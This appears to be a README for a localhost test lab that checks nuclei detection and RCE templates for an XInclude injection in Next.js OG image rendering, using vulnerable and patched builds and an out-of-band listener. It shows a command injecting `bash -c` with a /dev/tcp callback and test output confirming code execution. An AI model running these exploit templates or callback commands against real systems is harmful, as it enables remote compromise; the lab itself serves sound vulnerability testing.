# CVE-2026-94545 local test lab

A reproducible localhost target to answer one question: **do the templates in the parent
directory actually work against the affected product?**

It builds the real vulnerable stack — the same app the advisory ships, on the exact Node
build the ROP chain targets — plus a patched twin as a negative control:

| | port | build | role |
| --- | --- | --- | --- |
| `run/vulnerable` | 3000 | Next.js **16.3.5** (un-escaped OG text) | affected product |
| `run/patched` | 3001 | Next.js **16.3.6** (escaped OG text) | negative control |
| OOB listener | 4444 | `oob-listener.py` | receives the blind callback |

Both variants are the same tiny app: an `next/og` route that puts request data straight
into the SVG `<title>`, on the Node runtime, with `sharp` installed — i.e. the native
libvips → librsvg → libxml2 pipeline, not the sandboxed `resvg-wasm` one.

```
lab/
├── setup.sh            build Node 24.20.0 + both app variants      (run once)
├── start.sh            start vulnerable / patched / OOB listener
├── stop.sh             stop everything (frees leftover ports)
├── run-tests.sh        run both templates against both builds -> PASS/FAIL summary
├── oob-listener.py     catches the exploit's blind callback
├── app/                the test app (route + version endpoint + console)
└── tools/
    ├── nuclei-shim.mjs offline runner for nuclei JS-protocol templates
    ├── http-fetch.mjs  one-shot HTTP helper used by the shim
    └── validate.mjs    YAML + nuclei JSON schema + JS syntax checks
```

## Quick start

```bash
cd lab
./setup.sh          # ~1 min: fetches Node 24.20.0, installs and builds both variants
./start.sh          # :3000 vulnerable, :3001 patched, :4444 OOB listener
./run-tests.sh      # 26 checks, PASS/FAIL summary; restarts the target at the end
```

`run-tests.sh --no-rce` skips the destructive exploit test (the one that kills the
vulnerable worker).

Open <http://127.0.0.1:3000> for the target's index, <http://127.0.0.1:3000/lab> for an
interactive console where you can paste a payload and watch the PNG size, and
<http://127.0.0.1:3000/api/lab-info> for the exact library versions in use.

## What the suite verifies

```
=== target stack ===
  vulnerable target runs Next.js 16.3.5        patched target runs Next.js 16.3.6
  un-escaped vs escaped text serialization     node v24.20.0 (non-PIE), libxml2 2.15.3
=== CVE-2026-94545.yaml (detection) ===
  matches the vulnerable build                 probe=2522895B control=21979B ratio=114.8
  does not match the patched build             closed port -> "not matched", not an error
  -var base=... override still matches
=== CVE-2026-94545-rce.yaml ===
  pre-condition gate blocks the patched build  (payload never sent)
  72-byte command refused with the 71-byte limit message, nothing sent
  patched build survives the payload, no callback
  vulnerable build: payload delivered -> request aborted -> callback received
      uid=1001(user) gid=1001(user) groups=1001(user),27(sudo),100(users)
  vulnerable worker replaced (connection refused), then restarted and re-detected
=== summary ===
  26 passed, 0 failed
```

## Testing with the real nuclei

The lab is the target, not the tool: nothing here replaces nuclei. The intended workflow is
`nuclei` on your machine against these ports.

```bash
# terminal 1
cd lab && ./setup.sh && ./start.sh

# terminal 2 - real nuclei, real interactsh
nuclei -u http://127.0.0.1:3000 -t CVE-2026-94545.yaml
nuclei -u http://127.0.0.1:3000 -t CVE-2026-94545-rce.yaml

# negative control
nuclei -u http://127.0.0.1:3001 -t CVE-2026-94545.yaml          # no match expected
nuclei -u http://127.0.0.1:3001 -t CVE-2026-94545-rce.yaml      # gate stops it

# without interactsh, with your own callback
nuclei -u http://127.0.0.1:3000 -t CVE-2026-94545-rce.yaml \
       -var 'cmd=bash -c "id>/dev/tcp/127.0.0.1/4444"'
tail -f lab/oob-hits.log
```

If the target's worker is replaced by the exploit, `./start.sh --restart vulnerable`
brings it back.

### Why there is also a shim

This machine has no Go toolchain and cannot download a nuclei release binary, so the
templates cannot be executed by nuclei here. `tools/nuclei-shim.mjs` fills the gap by
re-implementing the parts of the JavaScript protocol the templates use, following the real
implementation in `projectdiscovery/nuclei`:

* `args` are injected as globals in the JS runtime (`pkg/js/compiler/session.go`)
* `{{Host}}` / `{{Hostname}}` / `{{Port}}` are derived from the input
  (`pkg/protocols/javascript/js.go`)
* template `variables` are rendered with those values, and `-var` overrides them
* `success` is the truthiness of the script's last expression; a falsy pre-condition skips
  the request; matchers run against the resulting data map
* `nuclei/http` `Client`/`Get`/`Post`/`Response` behave as in `pkg/js/libs/http`, including
  blocking inside the JS call

It is not nuclei. Two gaps are printed instead of hidden:

* **interactsh is unavailable.** Pass `--oob-log lab/oob-hits.log` and the shim treats a
  callback recorded by `oob-listener.py` as satisfying the `interactsh_protocol` matcher —
  the same correlation nuclei gets from its interactsh server, done locally.
* **the matcher/DSL surface is a subset** (`word`, `regex`, `dsl` with
  `success`/`contains`/`to_lower`/`len`). Anything else is reported as `SKIP`, never as a
  silent pass.

Use it to iterate quickly; confirm with real nuclei before trusting a verdict on a
production target.

`tools/validate.mjs` is the other half: YAML parse, nuclei JSON schema (`nuclei-jsonschema.json`,
vendored from the nuclei repository), and a `new Function()` syntax check of every
`init`/`pre-condition`/`code` block — the closest thing to `nuclei -validate` available here.

## Notes on the vulnerable stack

* The non-PIE requirement is real: `setup.sh` reads the ELF header of the Node binary and
  aborts if it is not `ET_EXEC`, because every gadget address in the template is pinned to
  that layout.
* Next 16.3.5 and 16.3.6 ship the same `@vercel/og@0.11.1` wrapper, but the bundled satori
  build differs: 16.3.6 routes text through `escape-html` (the bundle imports it twice),
  16.3.5 does not. `/api/lab-info` reports this as `"escaping"`, which is what decides
  whether the injected `xi:include` survives into the SVG.
* The bug is only reachable on the Node runtime with `sharp` present. Removing `sharp` or
  switching the route to the Edge runtime puts `resvg-wasm` in the path and the injection
  becomes inert — the detection template reports no match there, which is the third
  negative-control shape worth testing on a fork of this app.
